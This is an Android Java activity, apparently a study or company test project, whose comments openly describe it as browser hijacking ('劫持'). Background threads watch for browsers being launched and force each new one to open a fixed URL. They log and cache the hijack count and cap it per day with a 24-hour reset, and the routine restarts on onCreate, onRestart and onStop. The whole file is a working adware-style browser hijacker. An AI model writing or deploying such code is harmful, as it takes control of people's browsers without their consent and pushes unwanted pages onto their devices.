package com.tang.study.companytest1;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.util.StringBuilderPrinter;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private boolean isLaucher;
    private Handler handler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {

            Toast.makeText(MainActivity.this, (String)msg.obj, Toast.LENGTH_SHORT).show();
            return true;
        }
    });
    public static final String URI = "http://www.sohu.com";
    private Intercept intercept;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        test2(1000, URI);
        test2(6, URI);
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        test2(6, URI);
    }

    @Override
    protected void onStop() {
        super.onStop();
//        test2(1000, URI);
        test2(6, URI);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isLaucher = false;
        count = 0;
       /* Log.e("info", "onDestory()...");
        isLaucher = false;
        count = 0;
        SharedPreferences sharedPreferences = getSharedPreferences(SAVE_FILE_NAME, Context.MODE_PRIVATE);

        firstLauTime = sharedPreferences.getLong("firstLauTime", 0);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        //
        //如果程序被杀掉，缓存拦截的次数进本地
        if(indexCount != 0){//有拦截次数
            editor.putInt("indexCount", indexCount);
            editor.commit();
        }
        Log.e("info", "destory() firstTime:" + firstLauTime + "indexCount:" + indexCount);*/

//        isFirst = false;

    }
    /**缓存劫持数据的文件名*/
//    public static final String SAVE_FILE_NAME = "interceptDataFile";
    /**缓存第一次劫持的时间*/
    public static final String FIRTST_LAUCHER_TIME = "firstLauTime";
    /**缓存劫持的次数*/
    public static final String INDEX_COUNT = "indexCount";
    /**用来记录浏览器是否启动的状态*/
    /**记录劫持的次数*/
//    private static int indexCount;
    private List<String> mList = new ArrayList<String>();
    private boolean isFirst;

    private void test1(final int maxTimes, final String jumpUri){
        new Thread(new Runnable() {
            @Override
            public void run() {
                SharedPreferences sharedPreferences = getSharedPreferences(SAVE_FILE_NAME, Context.MODE_PRIVATE);
                while(true){
                    //如果超过一天
                    long firstLaucherTime = sharedPreferences.getLong(FIRTST_LAUCHER_TIME, 0l);
                    if(((firstLaucherTime != 0) && (System.currentTimeMillis() - firstLaucherTime) > 24*60*60*1000)){
                        mList.clear();
                        sharedPreferences.edit().clear();
                        isFirst = false;
                    }
                    //如果达到每天最大的劫持次数
                    indexCount = sharedPreferences.getInt(INDEX_COUNT, 0);
                    Log.e("Cat","indexCount:" + indexCount);
                    if(indexCount >= maxTimes){
                        sharedPreferences.edit().putInt(INDEX_COUNT, 0);//
                        break;//
                    }
                    //
                    mList.clear();
                    List<String> list = BrowsableUtil.getLaucherPro(MainActivity.this);
                    if(list.size() == 0){
                        Log.e("Cat", "劫持  当前没有任何运行的浏览器");
                    }else {
                        mList.addAll(list);
                        for (String s : list) {

                            Log.e("Cat", "劫持  mList集合数据：" + s);
                        }

                        String pkgName = BrowsableUtil.isLaucherPro(MainActivity.this);
                        Log.e("Cat", "劫持 正在运行浏览器:" + pkgName);

                        if (!mList.contains(pkgName)) {//
                            //
                            //添加进缓存集合
                            mList.add(pkgName);
                            if (mList.size() == 1 && isFirst == false) {//第一次劫持
                                isFirst = true;
                                //缓存第一次劫持的时间
                                SharedPreferences.Editor e = getEditor(SAVE_FILE_NAME);
                                e.putLong(FIRTST_LAUCHER_TIME, System.currentTimeMillis());
                                e.commit();
                            }
                            //劫持
                            Intent intent = new Intent(Intent.ACTION_VIEW);
                            intent.setPackage(pkgName);
                            intent.setData(android.net.Uri.parse(jumpUri));
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            MainActivity.this.startActivity(intent);
                            ++indexCount;//劫持成功，缓存劫持次数
                            Log.e("Cat", "劫持:" + pkgName + ", 劫持次数 indexCount:" + indexCount);
                            SharedPreferences.Editor e = getEditor(SAVE_FILE_NAME);
                            e.putInt(INDEX_COUNT, indexCount);
                            e.commit();
                        }
                    }//

                    try {
                        Thread.sleep(200);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }


            }
        }).start();
    }
    private void test(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                int index;
                while(true){
                    index = 0;
                    List<String> list = BrowsableUtil.getLaucherPro(MainActivity.this);
                    if(list == null){
                        Log.e("info", "没有检测任何浏览器启动");

                    }else{
                        String n = BrowsableUtil.isLaucherPro(MainActivity.this);
                        Log.e("info", "检测到正在运行浏览器：" + n);
                        StringBuilder builder = new StringBuilder();
                        for(String s : list){
                            builder.append(++index + "、" + s);
                        }
                        Log.e("info", "检测到所有正在运行的浏览器：" + builder.toString());
                    }
                }
            }
        }).start();
    }
    private static int count;
    private static long firstLauTime;//记录第一次启动的时间
    private int indexCount;
    private static final String SAVE_FILE_NAME = "saveInterDataFile";

    private void test2(final int maxTimes,final String jumpUri){
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<String> runningList = null;
                SharedPreferences sharedPreferences = MainActivity.this.getSharedPreferences(
                        SAVE_FILE_NAME, Context.MODE_PRIVATE);
                while(true){
                    firstLauTime = sharedPreferences.getLong("firstLauTime", 0);//每次获取缓存的第一次拦截的时间
                    Log.e("info", "firstLauTime:" + firstLauTime);
                    //如果时间超过1天，所有状态还原
                    if(firstLauTime != 0 && (System.currentTimeMillis() - firstLauTime) > 24*60*60*1000){//
                        isLaucher = false;
                        indexCount = 0;
                        getEditor(SAVE_FILE_NAME).clear();//清空缓存
                    }else {

                        if(indexCount >= maxTimes){
                            break;//如果达到最大拦截次数，结束循环
                        }

                        //获取到所有启动的浏览器
                        runningList = BrowsableUtil.getLaucherPro(MainActivity.this);
                        String pkgName = BrowsableUtil.isLaucherPro(MainActivity.this);
                        if (!(runningList == null || runningList.size() == 0) || "".equals(pkgName)) {
                            for(String s : runningList){
                                Log.e("info", "检测到启动的浏览器:" + s);
                            }

                            if (isLaucher && (runningList.size() - count) > 0) {//如果新启动浏览器
                                count = runningList.size();
                                isLaucher = true;
                                handler.obtainMessage(2, "检测到最新启动的浏览器：" + pkgName).sendToTarget();
                                //跳转指定Url
                                Intent intent = new Intent(Intent.ACTION_VIEW);
                                intent.setPackage(pkgName);
                                intent.setData(Uri.parse(jumpUri));
                                MainActivity.this.startActivity(intent);
                                //记录拦截的次数
                                indexCount++;
                                Log.e("info", "indexCount:" + indexCount);
                            }
                            if (!isLaucher) {
                                //
                                indexCount = sharedPreferences.getInt("indexCount", 0);
                                Log.e("info", "indexCont:" + indexCount);
                                firstLauTime = System.currentTimeMillis();
                                SharedPreferences.Editor editor = getEditor(SAVE_FILE_NAME);
                                editor.putLong("firstLauTime",firstLauTime);//缓存第一次拦截的时间进本地
                                editor.commit();
                                //第一次启动
                                count = runningList.size();
                                isLaucher = true;
                                handler.obtainMessage(2, "检测到最新启动的浏览器：" + pkgName).sendToTarget();
                                //跳转指定Url
                                Intent intent = new Intent(Intent.ACTION_VIEW);
                                intent.setPackage(pkgName);
                                intent.setData(Uri.parse(jumpUri));
                                MainActivity.this.startActivity(intent);
                                //记录拦截的次数
                                indexCount++;
                            }

                        } else {
                            count = 0;
                            if (isLaucher) {
                                isLaucher = false;
                            }
                        }

                    }

                }//while
            }
        }).start();
    }

    public SharedPreferences.Editor getEditor(String saveFile){
        SharedPreferences sharedPreferences = this.getSharedPreferences(saveFile, Context.MODE_PRIVATE);

        return  sharedPreferences.edit();
    }
}
